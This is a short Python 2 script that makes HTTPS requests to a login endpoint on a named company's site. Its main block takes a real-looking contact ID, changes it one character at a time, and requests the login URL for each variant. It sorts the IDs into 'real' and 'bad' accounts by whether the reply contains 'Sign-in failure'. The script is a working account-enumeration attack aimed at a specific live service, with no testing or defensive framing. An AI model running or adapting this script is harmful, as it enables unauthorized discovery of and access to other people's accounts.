from vyperlogix.misc import _psyco
from vyperlogix import oodb
from vyperlogix.hash import lists
import datetime
import os
import sys

_psyco.importPsycoIfPossible()

def HTTPSConnection(url):
    import socket
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url, 443))
    
    ssl_sock = socket.ssl(s)
    
    print repr(ssl_sock.server())
    print repr(ssl_sock.issuer())
    
    ssl_sock.write("""GET / HTTP/1.0\r
    Host: www.verisign.com\r\n\r\n""")
    
    data = ssl_sock.read()
    print 'data is "%s".' % (data)
    
    del ssl_sock
    s.close()
    
def HTTPSConnection2(url):
    import urllib2
    try:
        req = urllib2.Request(url=url)
        f = urllib2.urlopen(req)
        data = f.read()
    except Exception, details:
        data = 'ERROR: %s' % (str(details))
    return data

if (__name__ == '__main__'):
    _chars = ''.join([chr(ord('a')+ch) for ch in xrange(0,26)])+''.join([chr(ord('A')+ch) for ch in xrange(0,26)])+''.join([chr(ord('0')+ch) for ch in xrange(0,10)])
    url = 'https://molten.magma-da.com/contact/login_from_sf/00330000005sjDI'

    cid = '00330000005sjDI'
    _cid = cid
    _url = 'https://molten.magma-da.com/contact/login_from_sf/%s'
    
    d_real = lists.HashedLists2()
    d_fake = lists.HashedLists2()
    
    _charNum = 0
    _digitNum = len(_cid)
    while (_digitNum > 10):
        _uri = _url % _cid
        data = HTTPSConnection2(_uri)
        isReal = data.find('Sign-in failure') == -1
        pos = '(%d,%d)' % (_digitNum,_charNum)
        if (isReal):
            d_real[_cid] = _uri
            n_real = len(d_real)
            p_real = (float(n_real) / float(n_real+len(d_fake)))*100.0
            print 'Real Account #%d (%2.2f%%) %s --> %s' % (n_real,p_real,pos,_uri)
        else:
            d_fake[_cid] = _uri
            n_fake = len(d_fake)
            p_fake = (float(n_fake) / float(n_fake+len(d_real)))*100.0
            print 'BAD Account --> #%d (%2.2f%%) %s %s' % (n_fake,p_fake,pos,_uri)
        l_cid = [ch for ch in _cid]
        l_cid[_digitNum-1] = _chars[_charNum]
        _cid = ''.join(l_cid)
        _charNum += 1
        if (_charNum >= len(_chars)):
            _charNum = 0
            _digitNum -= 1
    
    #_url = 'www.verisign.com'
    #HTTPSConnection(_url)
